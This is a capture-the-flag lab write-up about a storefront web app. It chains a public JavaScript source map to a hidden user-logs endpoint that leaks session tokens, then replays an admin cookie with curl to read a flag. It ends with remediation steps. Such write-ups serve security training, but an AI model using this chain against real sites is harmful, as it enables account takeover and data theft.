# Rolodex Pwnbox Lab - Source Map to Token Leak (2026-07-09 instance)

Date: 2026-07-09
Target type: CTF/lab
Host: `https://e6d594d3b237.pwnbox-lab.com/`
Bug class: Public source map disclosure, hidden endpoint discovery, missing authorization, session token exposure

## Observation

Same Rolodex storefront SPA as the 2026-06-06 instance:

- Title: **Rolodex**
- Backend: Express (`x-powered-by: Express`)
- First-visit cookie: `token=usr_...; SameSite=Lax`
- Bundle: `/assets/index-DPm9vOq3.js`
- Stylesheet: `/assets/index-Ct_kMsSy.css`

Visible UI endpoints from client code:

- `/api/products`
- `/api/categories`
- `/api/products/:id`
- `/api/profile`

Lab copy: polished catalog/storefront; hidden detail only appears on second look.

## Hypothesis

Production source map for the bundle is public and may embed `sourcesContent` with tree-shaken constants not present in minified JS.

## Evidence

Source map reachable without auth:

```text
GET /assets/index-DPm9vOq3.js.map
```

`../../src/api/endpoints.ts` inside `sourcesContent` contained:

```ts
export const USER_LOGS = '/api/users/logs'
```

That constant is unused by the app bundle but the backend route is live.

Admin-only asset path also visible from stylesheet source in the map:

```css
.profile.admin {
  background-image: url(/twleoknsdcsbu);
}
```

## Test

```bash
curl -s https://e6d594d3b237.pwnbox-lab.com/api/users/logs
```

## Result

Unauthenticated JSON array of users with active `token` values. One admin record:

```json
{"username":"sable-admin","role":"admin","token":"adm_[redacted]"}
```

Replay admin token:

```bash
curl -s -H 'Cookie: token=adm_[redacted]' https://e6d594d3b237.pwnbox-lab.com/api/profile
```

```json
{"username":"sable-admin","role":"admin","orders":128,"saved":0}
```

Admin-only SVG route:

```bash
curl -s -H 'Cookie: token=adm_[redacted]' https://e6d594d3b237.pwnbox-lab.com/twleoknsdcsbu
```

- Without admin token: `404`
- With admin token: `200`, `image/svg+xml`, flag in SVG body (`pwnbox{...}`)

## Conclusion

Confirmed same chain as prior Rolodex instance:

```text
Public source map
-> hidden /api/users/logs discovery
-> unauthenticated active token disclosure
-> admin cookie replay
-> admin-only /twleoknsdcsbu flag read
```

## Failed Assumptions

- Minified bundle alone does not reveal `USER_LOGS`; must read `.js.map`.
- `sources` paths like `../../src/main.tsx` are not directly fetchable.
- SPA returns `200` HTML for many fake routes; `/api/users/logs` returns real JSON.

## Why The Working Test Worked

Tree shaking removed unused endpoint constants from production JS, but the map still shipped full `sourcesContent`. The sensitive endpoint had no server-side authorization and returned replayable session tokens.

## Reusable KB

- `writeups/rolodex-source-map-token-leak.md`
- `notes/source-maps-and-hidden-endpoints.md`
- `payloads/recon/source-map-extraction.md`
- `checklists/source-map-recon.md`
- `labs/2026-06-06-rolodex-source-map-token-leak.md` (first instance)

## Fix

- Restrict or remove production source maps.
- Authorize `/api/users/logs`; never return raw tokens.
- Protect `/twleoknsdcsbu` server-side by role, not CSS obscurity.
- Rotate disclosed tokens.
